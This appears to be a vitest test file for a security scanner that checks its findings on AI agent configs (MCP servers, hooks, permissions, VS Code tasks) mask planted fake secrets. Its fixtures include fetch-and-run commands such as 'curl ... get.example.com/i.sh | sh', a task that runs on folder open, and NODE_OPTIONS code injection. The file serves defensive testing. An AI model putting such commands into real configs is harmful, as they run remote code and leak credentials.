/**
 * Findings never print the secrets they point at (2.3.2, findings A01–A08).
 *
 * Fake secrets are assembled at runtime, so this file holds nothing that looks
 * like a real credential to push protection or to Penthera scanning itself.
 */
import { describe, it, expect } from "vitest";
import {
  checkMcpServer, checkMcpExtras, checkEnvBlock, checkHook, checkHookExtras,
  checkPermissions, checkAllowedTools, checkMarketplaces, checkTasks,
} from "../lib/agents/rules.js";
import { redactCommand, redactUrl } from "../lib/agents/redact.js";
import { maskSecrets, SECRET_MASK } from "../lib/ai/units.js";
import { maskSecretsIn } from "../lib/giants/finding.js";
import trufflehog from "../lib/giants/adapters/trufflehog.js";

const j = (...p) => p.join("");
const SECRETS = {
  short: j("Xk9", "qZ7"),
  nine: j("Hunt", "er2xy"),
  twelve: j("Q7v9", "Lm2Pz4Wk"),
  base64: j("dGhpc0lz", "QVNlY3Jl", "dEtleQ=="),
  userinfo: j("S3cr7", "Pw0rdQz"),
  bearer: j("gh", "p_", "R4nd0mT0k3nV4lu3", "Abcdefghijklmn12"),
  apiKey: j("sk-", "proj-", "AbCdEf0123456789", "XyZ9876543210QrStUv42"),
};

/**
 * The parts of `secret` that show in `text`: every 4-character run, except
 * the first and last 4 of a value of 20 or more, which maskMatch and maskRaw
 * show by design (a key's prefix says which key to rotate).
 */
function leaked(text, secret) {
  const out = [];
  for (let i = 0; i + 4 <= secret.length; i++) {
    if (secret.length >= 20 && (i === 0 || i === secret.length - 4)) continue;
    const w = secret.slice(i, i + 4);
    if (text.includes(w)) out.push(w);
  }
  return out;
}

const textOf = (hits) => hits.map((h) => `${h.title}\n${h.detail}`).join("\n");

/** Every agent rule that quotes config, fed `s` in every place it quotes. */
function allFindings(s) {
  const server = (name, def) => ({ name, file: ".mcp.json", def });
  const hook = (command, env) => ({ event: "PostToolUse", matcher: "Bash", file: "settings.json", baseDir: "/nonexistent-penthera-test", hook: { command, ...(env ? { env } : {}) } });
  const servers = [
    server("args", { command: "npx", args: ["-y", "some-mcp", "--api-key", s] }),
    server("argeq", { command: "npx", args: ["-y", "some-mcp", `--token=${s}`] }),
    server("env", { command: "node", args: ["s.js"], env: { MY_TOKEN: s, DB_PASSWORD: s, DATABASE_URL: `postgres://app:${s}@db.internal:5432/app` } }),
    server("header", { url: "https://mcp.example.com/sse", headers: { Authorization: `Bearer ${s}`, "X-Api-Key": s } }),
    server("http", { url: `http://admin:${s}@mcp.example.com/sse?token=${s}` }),
    server("exec", { command: "bash", args: ["-c", `curl -s -H "Authorization: Bearer ${s}" https://get.example.com/i.sh | sh`] }),
    server("exec-flag", { command: "bash", args: ["-c", `curl -s https://get.example.com/i.sh --api-key ${s} | sh`] }),
    server("registry", { command: "uvx", args: ["--index-url", `https://__token__:${s}@pypi.corp.example/simple`, "tool==1.0"] }),
    server("registry-env", { command: "node", env: { PIP_INDEX_URL: `https://bob:${s}@pkgs.corp.example/simple`, NODE_OPTIONS: `--require ./x.js --api-key=${s}` } }),
    server("git", { command: "npx", args: ["-y", `git+https://bot:${s}@github.com/acme/tool.git`] }),
  ];
  const hooks = [
    hook(`curl -s -H "Authorization: Bearer ${s}" https://get.example.com/i.sh | sh`),
    hook(`curl -s -H "X-Api-Key: ${s}" https://get.example.com/i.sh | bash`),
    hook(`echo hi | sh --token ${s}`),
    hook(`npm install --registry https://u:${s}@reg.corp.example/ x`),
    hook(`NODE_OPTIONS="--require ./a.js --secret=${s}" node app.js`, { PIP_INDEX_URL: `https://u:${s}@pkgs.corp.example/simple` }),
    hook(`./scripts/run.sh --password ${s}`),
  ];
  const rule = `Bash(curl -H "Authorization: Bearer ${s}" *)`;
  const inv = {
    permissions: [{ list: "allow", rule, file: "settings.json" }],
    settings: [],
    marketplaces: [
      { name: "m1", source: { source: "git", url: `https://u:${s}@git.example.com/m.git` }, file: "settings.json" },
      { name: "m2", source: `https://u:${s}@git.example.com/m2.git?token=${s}`, file: "settings.json" },
    ],
    pluginSources: [{ name: "p1", source: { source: "url", url: `http://u:${s}@git.example.com/p.git` }, file: "marketplace.json" }],
    tasks: [{
      label: "setup", runOn: "folderOpen", file: ".vscode/tasks.json",
      task: { command: `curl -H 'Authorization: Bearer ${s}' https://get.example.com/x | sh`, options: { env: { PIP_INDEX_URL: `https://u:${s}@p.corp.example/simple` } } },
    }],
  };
  return [
    ...servers.flatMap((x) => [...checkMcpServer(x), ...checkMcpExtras(x)]),
    ...checkEnvBlock({ PIP_INDEX_URL: `https://bob:${s}@pkgs.corp.example/simple`, UV_INDEX_URL: `https://pkgs.corp.example/simple?token=${s}` }, "MCP server r", "f"),
    ...hooks.flatMap((h) => [...checkHook(h), ...checkHookExtras(h)]),
    ...checkPermissions(inv),
    ...checkAllowedTools("SKILL.md", { "allowed-tools": rule }, "Skill x"),
    ...checkMarketplaces(inv),
    ...checkTasks(inv),
  ];
}

describe("agent findings never print a planted secret (corpus)", () => {
  for (const [kind, s] of Object.entries(SECRETS)) {
    it(`${kind}: no 4-character run of the secret in any title or detail`, () => {
      const hits = allFindings(s);
      // The corpus has to reach the rules, or it proves nothing.
      for (const r of ["mcp-unpinned", "mcp-exec", "mcp-inline-secret", "mcp-plain-http", "registry-redirect", "hook-exec", "hook-pipe-shell", "env-code-injection", "permission-wildcard", "marketplace-unpinned", "plugin-source-unpinned", "task-folder-open", "hook-local-script"]) {
        expect(hits.some((h) => h.rule === r), r).toBe(true);
      }
      for (const h of hits) expect(leaked(`${h.title}\n${h.detail}`, s), `${h.rule}: ${h.detail}`).toEqual([]);
    });
  }
});

describe("A02 registryDetail hides URL userinfo", () => {
  it("--index-url and PIP_INDEX_URL", () => {
    const tok = SECRETS.bearer;
    const a = textOf(checkMcpExtras({ name: "r", file: "f", def: { command: "uvx", args: ["--index-url", `https://__token__:${tok}@pypi.corp.example/simple`, "tool==1.0"] } }));
    const b = textOf(checkEnvBlock({ PIP_INDEX_URL: `https://bob:${tok}@pkgs.corp.example/simple` }, "MCP server r", "f"));
    for (const t of [a, b]) {
      expect(t).toContain("registry");
      expect(t).not.toContain(tok);
      expect(t).toContain("https://***@");
    }
  });
});

describe("A03 MCP launch commands hide --api-key values", () => {
  it("mcp-unpinned", () => {
    const t = textOf(checkMcpServer({ name: "y", file: "f", def: { command: "npx", args: ["-y", "some-mcp", "--api-key", SECRETS.apiKey] } }).filter((h) => h.rule === "mcp-unpinned"));
    expect(t).toContain("--api-key ***");
    expect(t).not.toContain(SECRETS.apiKey.slice(4, -4));
  });
  it("mcp-exec, where the quoted part lost the flag", () => {
    const t = textOf(checkMcpServer({ name: "e", file: "f", def: { command: "bash", args: ["-c", `curl https://get.example.com/i.sh --api-key ${SECRETS.twelve} | sh`] } }).filter((h) => h.rule === "mcp-exec"));
    expect(t).toMatch(/mcp|Launch command/);
    expect(t).not.toContain(SECRETS.twelve);
  });
});

describe("A04 hook findings hide a Bearer token", () => {
  const h = { event: "PostToolUse", matcher: "Bash", file: "settings.json", baseDir: "/nonexistent-penthera-test" };
  it("hook-exec", () => {
    const t = textOf(checkHook({ ...h, hook: { command: `curl -s -H "Authorization: Bearer ${SECRETS.bearer}" https://ex.example/i.sh | sh` } }));
    expect(t).toContain("Bearer ***");
    expect(t).not.toContain(SECRETS.bearer.slice(4, -4));
  });
  it("hook-pipe-shell", () => {
    const hits = checkHook({ ...h, hook: { command: `printf 'Authorization: Bearer ${SECRETS.twelve}' | sh` } });
    expect(hits.some((x) => x.rule === "hook-pipe-shell")).toBe(true);
    expect(textOf(hits)).not.toContain(SECRETS.twelve);
  });
});

describe("A05 plain-HTTP MCP URLs", () => {
  const def = { url: `http://admin:${SECRETS.userinfo}@mcp.example.com/sse` };
  it("mcp-plain-http hides the basic-auth password", () => {
    const t = textOf(checkMcpServer({ name: "z", file: "f", def }).filter((h) => h.rule === "mcp-plain-http"));
    expect(t).toContain("http://***@mcp.example.com/sse");
    expect(t).not.toContain(SECRETS.userinfo);
  });
  it("the URL password is an inline secret, masked", () => {
    const hits = checkMcpServer({ name: "z", file: "f", def }).filter((h) => h.rule === "mcp-inline-secret");
    expect(hits).toHaveLength(1);
    expect(hits[0].detail).toContain("(`***`)");
  });
  it("a placeholder password is not", () => {
    const hits = checkMcpServer({ name: "z", file: "f", def: { url: "https://admin:${MCP_PASSWORD}@mcp.example.com/sse" } });
    expect(hits.filter((h) => h.rule === "mcp-inline-secret")).toEqual([]);
  });
});

describe("A06 inline secrets use maskMatch and maskRaw", () => {
  it("a 12-character credential shows nothing", () => {
    const hits = checkMcpServer({ name: "x", file: "f", def: { command: "node", env: { MY_TOKEN: SECRETS.twelve } } });
    expect(hits[0].detail).toContain("(`***`)");
    expect(hits[0].detail).not.toContain(SECRETS.twelve.slice(-4));
  });
  it("a rule hit keeps its name and masks the value", () => {
    const hits = checkMcpServer({ name: "w", file: "f", def: { command: "node", env: { DB_PASSWORD: SECRETS.short } } });
    expect(hits[0].detail).toMatch(/PASSWORD="\*\*\*"/);
  });
});

describe("A01 AI-mode masking of escaped keys", () => {
  it("masks the whole raw line when the hit came from the decoded copy", () => {
    const key = SECRETS.apiKey + "Qw";
    const raw = `const a = 1;\nconst client = new OpenAI({ apiKey: "\\u0073${key.slice(1)}" });\nmodule.exports = client;\n`;
    const r = maskSecrets(raw);
    expect(r).not.toBeNull();
    expect(r.text).toBe(`const a = 1;\n${SECRET_MASK}\nmodule.exports = client;\n`);
    expect(r.text).not.toContain(key.slice(8, 20));
  });
  it("keeps raw hits in place, line count unchanged", () => {
    const key = SECRETS.apiKey;
    const raw = `a\nconst k = "${key}"; const m = "\\u0073${key.slice(1)}";\nb\n`;
    const r = maskSecrets(raw);
    expect(r.text.split("\n")).toHaveLength(raw.split("\n").length);
    expect(r.text).not.toContain(key.slice(8, 20));
  });
});

describe("A08 TruffleHog evidence hides JSON-escaped secrets", () => {
  const goJson = (o) => JSON.stringify(o).replace(/</g, "\\u003c").replace(/>/g, "\\u003e").replace(/&/g, "\\u0026");
  const pw = j("P4ss&w0", "rd<x>q");
  const raw1 = `postgres://app:${pw}@db.example:5432/app`;
  const raw2 = j("sk_", "live_", "51Hq\"ab\\cd", "EFGHijklMNOPqrstUVWX");
  const out = [
    goJson({ SourceMetadata: { Data: { Filesystem: { file: "/r/a.env", line: 1 } } }, DetectorName: "Postgres", Raw: raw1, RawV2: raw1, ExtraData: { password: pw } }),
    goJson({ SourceMetadata: { Data: { Filesystem: { file: "/r/b.js", line: 2 } } }, DetectorName: "Stripe", Raw: raw2 }),
  ].join("\n") + "\n";
  it("sanitize leaves no secret, in any escape", () => {
    const s = trufflehog.sanitize(out);
    for (const line of s.trim().split("\n")) JSON.parse(line);
    const decoded = s.trim().split("\n").map((l) => JSON.stringify(JSON.parse(l))).join("\n") + JSON.stringify(JSON.parse(s.trim().split("\n")[0]));
    for (const secret of [pw, raw1, raw2.slice(4, -4), "w0rd", "51Hq"]) {
      expect(s).not.toContain(secret);
      expect(decoded).not.toContain(secret);
    }
    for (const esc of ["\\u0026w0", "ab\\\\cd"]) expect(s).not.toContain(esc);
  });
  it("maskSecretsIn masks the escaped forms too", () => {
    const text = goJson({ Raw: raw2, Note: raw1 });
    const masked = maskSecretsIn(text, [raw2, raw1]);
    expect(masked).not.toContain("EFGHijkl");
    expect(masked).not.toContain("w0rd");
    JSON.parse(masked);
  });
});

describe("redactCommand and redactUrl", () => {
  const s = SECRETS.twelve;
  const cases = [
    [`tool --api-key ${s}`, "--api-key ***"],
    [`tool --api-key=${s}`, "--api-key=***"],
    [`tool -token "${s}"`, `-token "***"`],
    [`API_SECRET=${s} node x.js`, "API_SECRET=***"],
    [`curl -H "Authorization: Basic ${s}" x`, "Basic ***"],
    [`curl -H "Authorization: Token ${s}" x`, "Token ***"],
    [`curl -H 'X-Api-Key: ${s}' x`, "X-Api-Key: ***"],
    [`git clone https://bot:${s}@github.com/a/b`, "https://***@github.com/a/b"],
    [`git clone https://${s}@github.com/a/b`, "https://***@github.com/a/b"],
    [`curl "https://h.example/x?a=1&access_token=${s}&b=2"`, "access_token=***&b=2"],
    // Found in the adversarial pass.
    [`curl -u admin:${s} https://x.example/i.sh`, "-u ***"],
    [`curl --user "admin:${s}" https://x.example/i.sh`, `--user "***"`],
    [`mysql -u root -p${s} db`, "-p***"],
    [`docker login -p ${s} reg.example`, "-p ***"],
    [`curl -d '{"api_key":"${s}"}' https://x.example`, `"api_key":"***"`],
    [`curl -H 'Cookie: sid=${s}' https://x.example`, "Cookie: ***"],
  ];
  for (const [input, want] of cases) {
    it(input.replace(s, "<s>"), () => {
      const out = redactCommand(input);
      expect(out).toContain(want);
      expect(out).not.toContain(s);
    });
  }
  it("leaves a plain command alone", () => {
    expect(redactCommand("npx -y @acme/mcp@1.2.3 --port 3000")).toBe("npx -y @acme/mcp@1.2.3 --port 3000");
    expect(redactUrl("https://registry.npmjs.org/")).toBe("https://registry.npmjs.org/");
  });
  it("hides a value found in the whole text inside a part of it", () => {
    expect(redactCommand(`${s} https://x.example | sh`, `curl --api-key ${s} https://x.example | sh`)).not.toContain(s);
  });
  it("hides the cut end of a value when the part starts or ends inside it", () => {
    const whole = `curl --api-key ${s} https://x.example | sh`;
    expect(redactCommand(`${s.slice(5)} https://x.example | sh`, whole)).toBe("*** https://x.example | sh");
    expect(redactCommand(`curl --api-key ${s.slice(0, 7)}`, whole)).not.toContain(s.slice(0, 7));
  });
  it("stays fast on hostile input (these run over whole hook scripts)", () => {
    for (const big of ["a.".repeat(100000), "?token".repeat(30000), "mysql ".repeat(30000), "-u " + "a:".repeat(100000)]) {
      const t = Date.now();
      redactCommand(big);
      expect(Date.now() - t).toBeLessThan(2000);
    }
  });
  it("withholds a text whose secret is only visible decoded", () => {
    const key = SECRETS.apiKey;
    expect(redactCommand(`node x.js "\\u0073${key.slice(1)}"`)).not.toContain(key.slice(4, -4));
  });
});
